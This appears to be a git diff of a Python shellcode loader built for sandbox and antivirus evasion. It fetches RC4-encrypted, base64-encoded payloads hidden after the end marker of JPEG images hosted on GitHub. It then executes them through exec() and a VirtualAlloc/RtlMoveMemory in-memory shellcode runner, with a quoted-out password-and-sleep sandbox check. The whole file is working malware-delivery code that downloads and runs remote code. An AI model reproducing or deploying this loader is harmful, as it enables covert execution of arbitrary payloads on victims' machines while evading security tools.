@@ -2,7 +2,9 @@ import hashlib,base64
 import requests
 from ctypes import *
 import random,sys,os
-def my_exit():
+from time import sleep
+'''
+def sandbox():
     if os.path.exists('1.txt'):
         print('not sanbox')
     else:
@@ -11,10 +13,23 @@ def my_exit():
 if __name__=="__main__":
     my_exit()
 
+def Sandbox():
+    if len(sys.argv)!=1:
+        pwd=sys.argv[1]
+        if passwd==pwd:
+            print('not sanbox')
+            main()
+        else:
+            sleep(random.randint(0,5))
+            sys.exit()
+    else:
+        sleep(random.randint(0,5))
+        sys.exit()
+'''
 key='123456'
-key2='123456'
-PayloadFileLocation='https://github.com/king-notfound404/pass_sanbox/blob/main/shellcode_img1.jpg'
-LoaderFileLocation='https://github.com/king-notfound404/pass_sanbox/blob/main/load_img1.jpg'
+passwd='123456'
+PayloadFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/shellcode_img1.jpg'
+LoaderFileLocation='https://raw.githubusercontent.com/king-notfound404/pass_sanbox/main/loader_img1.jpg'
 def rc4(text,key):
     key=hashlib.md5(key).hexdigest()
     text=base64.b64decode(text)
@@ -34,15 +49,44 @@ def rc4(text,key):
         k=chr(ord(element)^box[(box[i]+box[j])%256])
         result+=k
     return result
-useless=str(random.random())
-r=requests.get(PayloadFileLocation)
-lr=requests.get(LoaderFileLocation)
-sarr=r.content.split('\xff\xd9')[1]
-sarr_ld=lr.content.split('\xff\xd9')[1]
-code=rc4(sarr,key)
-loader=rc4(sarr_ld,key2)
-useless+=str(random.random())
-code=bytearray(base64.b64decode(code))
-load=base64.b64decode(loader)
-exec(load)
+    
+class GetApp:
+    def __init__(self):
+        pass
+
+    def shellcode(self):
+        try:
+            r=requests.get(PayloadFileLocation)
+            imgstr=r.content.split('\xff\xd9')[1]
+            shellcode=bytearray(base64.b64decode(rc4(imgstr,key)))
+            return shellcode
+        except IndexError:
+            print('networkerror')
+        except TypeError:
+            print('passkeyerror')
+        else:
+            print('notgood')
+
+    def loader(self):
+        try:
+            r=requests.get(LoaderFileLocation)
+            imgstr=r.content.split('\xff\xd9')[1]
+            loader=base64.b64decode(rc4(imgstr,key))
+            return loader
+        except IndexError:
+            print('networkerror')
+        except TypeError:
+            print('passkeyerror')
+        else:
+            print('notgood') 
+    
+def main():  
+    useless=str(random.random())
+    obj=GetApp()
+    code=obj.shellcode()
+    loader=obj.loader()
+    useless+=str(random.random())
+    exec(loader)
 #loader='VirtualAlloc = windll.kernel32.VirtualAlloc;VirtualProtect=windll.kernel32.VirtualProtect;useless+=random.choice(useless);whnd=windll.kernel32.GetConsolewindow();RtMoveMemory=windll.kernel32.RtlMoveMemory;memHscode=VirtualAlloc(c_int(0),c_int(len(code)),c_int(0x3000),c_int(0x40));buf=(c_char*len(code)).from_buffer(code);useless+=random.choice(useless)[:-1];RtlMoveMemory(c_int(memHscode),buf,c_int(len(code)));runcode=cast(memHscode,CFUNCTYPE(c_void_p));runcode()'
+if __name__=="__main__":
+    main()
